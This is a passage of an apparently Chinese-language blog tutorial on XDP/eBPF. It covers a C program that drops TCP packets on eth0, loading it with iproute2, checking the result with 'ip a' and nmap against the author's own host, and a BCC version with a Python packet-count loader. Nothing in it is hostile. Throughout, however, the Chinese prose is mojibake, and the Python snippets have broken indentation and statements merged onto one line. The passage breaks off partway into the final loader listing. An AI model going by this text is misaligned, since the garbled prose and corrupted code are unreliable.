ä¸ºæ•°æ®åŒ…å«ä»¥å¤ªç½‘å¸§ï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥ä»ä¸­æå–IPv4å±‚ã€‚æˆ‘ä»¬è¿˜æ£€æŸ¥IPv4å±‚çš„åç§»é‡æ˜¯å¦ä¸è¶…è¿‡æ•´ä¸ªæŒ‡é’ˆç©ºé—´ï¼Œä»¥ä¾¿èƒ½å¤Ÿé€šè¿‡é™æ€éªŒè¯å™¨ã€‚å½“è¶…å‡ºåœ°å€ç©ºé—´æ—¶ï¼Œæˆ‘ä»¬ä¼šä¸¢å¼ƒæ•°æ®åŒ…ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ipsize = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line">ip = data + ipsize;</span><br><span class="line">ipsize += <span class="keyword">sizeof</span>(struct iphdr); </span><br><span class="line"><span class="keyword">if</span> (data + ipsize &gt; data_end) &#123;</span><br><span class="line"><span class="keyword">return</span> XDP_DROP; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æ‰€æœ‰çš„éªŒè¯å’Œè®¾ç½®ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å®ç°ç¨‹åºçš„çœŸæ­£é€»è¾‘ï¼Œå®ƒåŸºæœ¬ä¸Šä¸¢å¼ƒæ¯ä¸ªTCPæ•°æ®åŒ…ï¼ŒåŒæ—¶å…è®¸å…¶ä»–ä»»ä½•ä¸œè¥¿ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ip-&gt;protocol == IPPROTO_TCP) &#123; </span><br><span class="line">  <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> XDP_PASS; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‡³æ­¤æˆ‘ä»¬çš„ç¨‹åºå°±å®Œæˆäº†ï¼Œ<code>program.c</code>å®Œæ•´ç¨‹åºä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEC(NAME) __attribute__((section(NAME), used))</span></span><br><span class="line"></span><br><span class="line">SEC(<span class="string">"mysection"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myprogram</span><span class="params">(struct xdp_md *ctx)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ipsize = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data;</span><br><span class="line">  <span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data_end;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">ip</span>;</span></span><br><span class="line"></span><br><span class="line">  ipsize = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line">  ip = data + ipsize;</span><br><span class="line">  ipsize += <span class="keyword">sizeof</span>(struct iphdr);</span><br><span class="line">  <span class="keyword">if</span> (data + ipsize &gt; data_end) &#123;</span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ip-&gt;protocol == IPPROTO_TCP) &#123;</span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> XDP_PASS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹ä¸€æ­¥æ˜¯ä½¿ç”¨<code>Clang</code>ä»æˆ‘ä»¬çš„ç¨‹åºä¸­ç¼–è¯‘å‡ºELFæ–‡ä»¶<code>program.o</code>ã€‚æˆ‘ä»¬å¯ä»¥åœ¨ç›®æ ‡æœºå™¨ä¹‹å¤–æ‰§è¡Œæ­¤ç¼–è¯‘æ­¥éª¤ï¼Œå› ä¸º<code>BPF ELF</code>äºŒè¿›åˆ¶æ–‡ä»¶ä¸ä¾èµ–äºå¹³å°ï¼Œå¯¹<code>program.c</code>ç¼–è¯‘å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt7]# clang -g -c -O2 -target bpf -c program.c -o program.o</span><br></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ipå®ç”¨ç¨‹åºå’Œsetå‘½ä»¤å°†<code>program.o</code>åŠ è½½åˆ°å…¬å…±ç½‘ç»œæ¥å£eth0ä¸Šï¼ŒåŠ è½½XDPç¨‹åºçš„è¯­æ³•å¾ˆç®€å•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt7]# ip link set dev eth0 xdp obj program.o sec mysection</span><br></pre></td></tr></table></figure><p>å¯¹ä¸Šè¿°å‘½ä»¤çš„åˆ†æå¦‚ä¸‹</p><p>ipï¼šè°ƒç”¨ipå‘½ä»¤</p><p>linkï¼šé…ç½®ç½‘ç»œæ¥å£</p><p>setï¼šæ›´æ”¹è®¾å¤‡å±æ€§</p><p>dev eth0ï¼šæŒ‡å®šæˆ‘ä»¬è¦åœ¨å…¶ä¸Šæ“ä½œå’ŒåŠ è½½XDPç¨‹åºçš„ç½‘ç»œè®¾å¤‡</p><p>xdp obj program.oï¼šä»åä¸º<code>program.o</code>çš„ELFæ–‡ä»¶ï¼ˆå¯¹è±¡ï¼‰åŠ è½½XDPç¨‹åºã€‚ æ­¤å‘½ä»¤çš„xdpéƒ¨åˆ†å‘Šè¯‰ç³»ç»Ÿåœ¨å¯ç”¨æ—¶ä½¿ç”¨æœ¬æœºé©±åŠ¨ç¨‹åºï¼Œå¦åˆ™å›é€€åˆ°é€šç”¨é©±åŠ¨ç¨‹åºã€‚ä½ å¯ä»¥é€šè¿‡ä½¿ç”¨æ›´å…·ä½“çš„é€‰æ‹©å™¨æ¥å¼ºåˆ¶ä½¿ç”¨ä¸€ç§æˆ–å¦ä¸€ç§æ¨¡å¼ï¼š</p><ul><li>xdpgeneric to use generic XDP</li><li>xdpdrv to use native XDP</li><li>xdpoffload to use offloaded XDP</li></ul><p>sec mysectionï¼šæŒ‡å®šåŒ…å«è¦ä»ELFæ–‡ä»¶ä¸­ä½¿ç”¨çš„BPFç¨‹åºçš„èŠ‚å<code>mysection</code>ï¼› å¦‚æœæœªæŒ‡å®šï¼Œå°†ä½¿ç”¨åä¸º<code>prog</code>çš„éƒ¨åˆ†ã€‚ å¦‚æœç¨‹åºä¸­æœªæŒ‡å®šä»»ä½•éƒ¨åˆ†ï¼Œåˆ™å¿…é¡»åœ¨ipè°ƒç”¨ä¸­æŒ‡å®šsec <code>.text</code>ã€‚</p><p>åœ¨è¿™ä¸ªé˜¶æ®µï¼Œå¦‚æœè¯¥å‘½ä»¤è¿”å›é›¶ä½œä¸ºé€€å‡ºä»£ç ä¸”æ²¡æœ‰é”™è¯¯ï¼Œæˆ‘ä»¬å¯ä»¥æ£€æŸ¥ç½‘ç»œæ¥å£ä»¥æŸ¥çœ‹ç¨‹åºæ˜¯å¦å·²æ­£ç¡®åŠ è½½ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# ip a show eth0</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 xdpgeneric/id:32 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 52:54:00:18:26:89 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.0.16.14/22 brd 10.0.19.255 scope global noprefixroute eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::5054:ff:fe18:2689/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>ip a</code>è¾“å‡ºäº†æ–°çš„ç»†èŠ‚ï¼›åœ¨MTUåé¢æ˜¾ç¤º<code>xdpgeneric/id:32</code>ï¼Œå®ƒæ˜¾ç¤ºäº†ä¸¤ä¸ªæœ‰è¶£çš„ä¿¡æ¯ï¼š</p><ul><li>æ›¾ç»ä½¿ç”¨è¿‡çš„é©±åŠ¨ï¼Œxdpgeneric</li><li>XDPç¨‹åºçš„IDï¼Œ32</li></ul><p>æœ€åä¸€æ­¥æ˜¯éªŒè¯åŠ è½½çš„ç¨‹åºæ˜¯å¦ç¡®å®åœ¨åšå®ƒåº”è¯¥åšçš„äº‹æƒ…ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨å¤–éƒ¨æœºå™¨ä¸Šå†æ¬¡æ‰§è¡Œ<code>nmap</code>æ¥è§‚å¯Ÿç«¯å£8000ä¸å†å¯è®¿é—®æ¥éªŒè¯è¿™ä¸€ç‚¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# nmap -sS 10.0.16.14</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2022-06-02 13:10 CST</span><br><span class="line">Nmap scan report for 10.0.16.14</span><br><span class="line">Host is up (0.0000030s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br></pre></td></tr></table></figure><p>å¦ä¸€ä¸ªéªŒè¯å®ƒæ˜¯å¦æ­£å¸¸å·¥ä½œçš„æµ‹è¯•æ˜¯å°è¯•é€šè¿‡æµè§ˆå™¨è®¿é—®ç¨‹åºæˆ–æ‰§è¡Œä»»ä½•HTTPè¯·æ±‚ã€‚ ä»¥<code>10.0.16.14</code>ä¸ºç›®æ ‡æ—¶ï¼Œä»»ä½•ç±»å‹çš„æµ‹è¯•éƒ½åº”è¯¥å¤±è´¥ã€‚ è¿™æ ·æˆ‘ä»¬å°±æˆåŠŸåŠ åœ¨äº†ç¬¬ä¸€ä¸ªXDPç¨‹åºï¼</p><p>å¦‚æœæ‚¨åœ¨éœ€è¦æ¢å¤åˆ°åŸå§‹çŠ¶æ€çš„æœºå™¨ä¸Šæ‰§è¡Œäº†æ‰€æœ‰è¿™äº›æ­¥éª¤ï¼Œåˆ™å¯ä»¥éšæ—¶åˆ†ç¦»ç¨‹åºå¹¶å…³é—­è®¾å¤‡çš„XDPï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ip link <span class="built_in">set</span> dev eth0 xdp off</span></span><br></pre></td></tr></table></figure><p>åœ¨ä½¿ç”¨<code>iproute2</code>ä½œä¸ºåŠ è½½å™¨æ—¶å¯ä»¥è·³è¿‡è‡ªå·±ç¼–å†™åŠ è½½å™¨çš„éƒ¨åˆ†ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬çš„é‡ç‚¹æ˜¯<code>iproute2</code>ï¼Œå®ƒå·²ç»ä¸ºXDPç¨‹åºå®ç°äº†ä¸€ä¸ªåŠ è½½å™¨ã€‚è¿™äº›ç¨‹åºå®é™…ä¸Šæ˜¯BPFç¨‹åºï¼Œå› æ­¤å³ä½¿<code>iproute2</code>æœ‰æ—¶å¾ˆæ–¹ä¾¿ï¼Œä½ å¯ä»¥ä½¿ç”¨ BCC åŠ è½½ç¨‹åºï¼Œä¾‹å¦‚åœ¨ä¸‹ä¸€èŠ‚ä½ å¯ä»¥ç›´æ¥ä½¿ç”¨bpfç³»ç»Ÿè°ƒç”¨ã€‚æ‹¥æœ‰è‡ªå®šä¹‰åŠ è½½å™¨çš„ä¼˜ç‚¹æ˜¯å…è®¸ç®¡ç†ç¨‹åºçš„ç”Ÿå‘½å‘¨æœŸåŠå…¶ä¸ç”¨æˆ·ç©ºé—´çš„äº¤äº’ã€‚</p><h4 id="XDPå’ŒBCC"><a href="#XDPå’ŒBCC" class="headerlink" title="XDPå’ŒBCC"></a>XDPå’ŒBCC</h4><p>ä¸å…¶ä»–BPFç¨‹åºä¸€æ ·ï¼Œå¯ä»¥ä½¿ç”¨BCCç¼–è¯‘ã€åŠ è½½å’Œè¿è¡ŒXDPç¨‹åºã€‚ æ¥ä¸‹æ¥çš„ç¤ºä¾‹æ˜¾ç¤ºäº†ä¸€ä¸ªXDPç¨‹åºï¼Œå®ƒä¸æˆ‘ä»¬ç”¨äº<code>iproute2</code>çš„ç¨‹åºç±»ä¼¼ï¼Œä½†å®ƒå…·æœ‰BCCåˆ¶ä½œçš„è‡ªå®šä¹‰ç”¨æˆ·ç©ºé—´åŠ è½½ç¨‹åºã€‚åœ¨è¿™ç§æƒ…å†µä¸‹éœ€è¦åŠ è½½ç¨‹åºæ˜¯å› ä¸ºè¦è®¡ç®—åœ¨ä¸¢å¼ƒTCPæ•°æ®åŒ…æ—¶é‡åˆ°çš„æ•°æ®åŒ…æ•°é‡ã€‚</p><p>é¦–å…ˆè¿˜æ˜¯åˆ›å»ºä¸€ä¸ªåä¸º<code>program.c</code>çš„å†…æ ¸ç©ºé—´ç¨‹åºã€‚</p><p>åœ¨<code>iproute2</code>ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬çš„ç¨‹åºéœ€è¦ä¸ºä¸BPFå’Œåè®®ç›¸å…³çš„ç»“æ„å’Œå‡½æ•°å®šä¹‰å¯¼å…¥æ‰€éœ€çš„å¤´æ–‡ä»¶ã€‚è¿™é‡Œæˆ‘ä»¬åšåŒæ ·çš„äº‹æƒ…ï¼Œä½†æˆ‘ä»¬è¿˜ä½¿ç”¨<code>BPF_TABLE</code>å®å£°æ˜äº†<code>BPF_MAP_TYPE_PERCPU_ARRAY</code>ç±»å‹çš„æ˜ å°„ã€‚ è¯¥æ˜ å°„å°†åŒ…å«æ¯ä¸ªIPåè®®ç´¢å¼•çš„æ•°æ®åŒ…è®¡æ•°å™¨ï¼Œè¿™å°±æ˜¯å¤§å°ä¸º256çš„åŸå› ï¼ˆIPè§„èŒƒä»…åŒ…å«256ä¸ªå€¼ï¼‰ã€‚ æˆ‘ä»¬æƒ³ä½¿ç”¨<code>BPF_MAP_TYPE_PERCPU_ARRAY</code>ç±»å‹ï¼Œå› ä¸ºå®ƒå¯ä»¥ä¿è¯CPUçº§åˆ«çš„è®¡æ•°å™¨çš„åŸå­æ€§ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KBUILD_MODNAME <span class="meta-string">"program"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line">BPF_TABLE(<span class="string">"percpu_array"</span>, <span class="keyword">uint32_t</span>, <span class="keyword">long</span>, packetcnt, <span class="number">256</span>);</span><br></pre></td></tr></table></figure><p>ä¹‹åå£°æ˜ä¸»å‡½æ•°<code>myprogram</code>ï¼Œå®ƒå°†<code>xdp_md</code>ç»“æ„ä½œä¸ºå‚æ•°ã€‚ é¦–å…ˆéœ€è¦åŒ…å«çš„æ˜¯ä»¥å¤ªç½‘IPv4å¸§çš„å˜é‡å£°æ˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myprogram</span><span class="params">(struct xdp_md *ctx)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> ipsize = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data;</span><br><span class="line"><span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data_end; </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">ip</span>;</span> <span class="keyword">long</span> *cnt;</span><br><span class="line">__u32 idx;</span><br><span class="line">ipsize = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line">ip = data + ipsize;</span><br><span class="line">ipsize += <span class="keyword">sizeof</span>(struct iphdr);</span><br></pre></td></tr></table></figure><p>åœ¨æˆ‘ä»¬å®Œæˆæ‰€æœ‰å˜é‡å£°æ˜å¹¶ä¸”å¯ä»¥è®¿é—®åŒ…å«ä»¥å¤ªç½‘å¸§çš„æ•°æ®æŒ‡é’ˆå’Œå¸¦æœ‰IPv4æ•°æ®åŒ…çš„ipæŒ‡é’ˆä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥æ£€æŸ¥å†…å­˜ç©ºé—´æ˜¯å¦è¶…å‡ºèŒƒå›´ã€‚ å¦‚æœæ˜¯ï¼Œæˆ‘ä»¬ä¸¢å¼ƒæ•°æ®åŒ…ã€‚ å¦‚æœå†…å­˜ç©ºé—´æ²¡é—®é¢˜ï¼Œæˆ‘ä»¬æå–åè®®å¹¶æŸ¥æ‰¾<code>packetcnt</code>æ•°ç»„ä»¥è·å–å˜é‡<code>idx</code>ä¸­å½“å‰åè®®çš„æ•°æ®åŒ…è®¡æ•°å™¨çš„å…ˆå‰å€¼ã€‚ç„¶åå°†è®¡æ•°å™¨åŠ ä¸€ã€‚å¤„ç†å®Œå¢é‡åï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­æ£€æŸ¥åè®®æ˜¯å¦ä¸ºTCPã€‚ å¦‚æœæ˜¯ï¼Œæˆ‘ä»¬å°±ç›´æ¥ä¸¢å¼ƒæ•°æ®åŒ…ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (data + ipsize &gt; data_end) &#123; </span><br><span class="line">  <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">&#125;</span><br><span class="line">idx = ip-&gt;protocol;</span><br><span class="line">cnt = packetcnt.lookup(&amp;idx); </span><br><span class="line"><span class="keyword">if</span> (cnt) &#123;</span><br><span class="line">*cnt += <span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ip-&gt;protocol == IPPROTO_TCP) &#123; </span><br><span class="line">  <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> XDP_PASS; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>program.c</code>å®Œæ•´ç¨‹åºå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KBUILD_MODNAME <span class="meta-string">"program"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BPF_TABLE(<span class="string">"percpu_array"</span>, <span class="keyword">uint32_t</span>, <span class="keyword">long</span>, packetcnt, <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myprogram</span><span class="params">(struct xdp_md *ctx)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ipsize = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data;</span><br><span class="line">  <span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data_end;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">ip</span>;</span></span><br><span class="line">  <span class="keyword">long</span> *cnt;</span><br><span class="line">  __u32 idx;</span><br><span class="line"></span><br><span class="line">  ipsize = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line">  ip = data + ipsize;</span><br><span class="line">  ipsize += <span class="keyword">sizeof</span>(struct iphdr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (data + ipsize &gt; data_end) &#123;</span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  idx = ip-&gt;protocol;</span><br><span class="line">  cnt = packetcnt.lookup(&amp;idx);</span><br><span class="line">  <span class="keyword">if</span> (cnt) &#123;</span><br><span class="line">    *cnt += <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ip-&gt;protocol == IPPROTO_TCP) &#123;</span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> XDP_PASS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç°åœ¨å¯ä»¥ç¼–å†™åŠ è½½ç¨‹åº<code>loader.py</code></p><p>å®ƒç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼šå®é™…åŠ è½½é€»è¾‘å’Œæ‰“å°æ•°æ®åŒ…çš„å¾ªç¯è®¡æ•°ã€‚</p><p>å¯¹äºåŠ è½½é€»è¾‘ï¼Œæˆ‘ä»¬é€šè¿‡è¯»å–æ–‡ä»¶<code>program.c</code>æ‰“å¼€ç¨‹åºã€‚ é€šè¿‡<code>load_func</code>æŒ‡ç¤ºbpfç³»ç»Ÿè°ƒç”¨ä½¿ç”¨ç¨‹åºç±»å‹ <code>BPF.XDP</code>å°†<code>myprogram</code>å‡½æ•°ç”¨ä½œâ€œmainâ€ã€‚ è¿™ä»£è¡¨`BPF_PROG_TYPE_XDP    ã€‚</p><p>åŠ è½½åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>get_table</code>è®¿é—®åä¸º<code>packetcnt</code>çš„BPFæ˜ å°„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">device = <span class="string">"eth0"</span></span><br><span class="line">b = BPF(src_file=<span class="string">"program.c"</span>)</span><br><span class="line">fn = b.load_func(<span class="string">"myprogram"</span>, BPF.XDP)</span><br><span class="line">b.attach_xdp(device, fn, <span class="number">0</span>)</span><br><span class="line">packetcnt = b.get_table(<span class="string">"packetcnt"</span>)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦ç¼–å†™çš„å‰©ä½™éƒ¨åˆ†æ˜¯æ‰“å°æ•°æ®åŒ…è®¡æ•°çš„å®é™…å¾ªç¯ã€‚æˆ‘ä»¬æœ‰ä¸¤ä¸ªå¾ªç¯ã€‚ å¤–éƒ¨å¾ªç¯è·å–é”®ç›˜äº‹ä»¶å¹¶åœ¨æœ‰ä¿¡å·ä¸­æ–­ç¨‹åºæ—¶ç»ˆæ­¢ã€‚å½“å¤–å¾ªç¯ä¸­æ–­æ—¶ï¼Œå°†è°ƒç”¨<code>remove_xdp</code>å‡½æ•°ï¼Œå¹¶å°†æ¥å£ä»XDPç¨‹åºä¸­é‡Šæ”¾å‡ºæ¥ã€‚</p><p>åœ¨å¤–å¾ªç¯ä¸­ï¼Œå†…å¾ªç¯çš„èŒè´£æ˜¯ä»<code>packetcnt</code>æ˜ å°„ä¸­å–å›å€¼å¹¶æ ¼å¼åŒ–æ‰“å°å®ƒä»¬ï¼š<code>counter pkt/s</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">prev=[<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line">print(<span class="string">"Printing packet counts per IP protocol-number, hit CTRL+C to stop"</span>) </span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> packetcnt.keys():</span><br><span class="line">val = packetcnt.sum(k).value i = k.value</span><br><span class="line"><span class="keyword">if</span> val:</span><br><span class="line">          delta = val - prev[i]</span><br><span class="line">prev[i] = val</span><br><span class="line">print(<span class="string">"&#123;&#125;: &#123;&#125; pkt/s"</span>.format(i, delta))</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">print(<span class="string">"Removing filter from device"</span>) </span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">b.remove_xdp(device, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><code>loader.py</code>ç¨‹åºå®Œæ•´å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 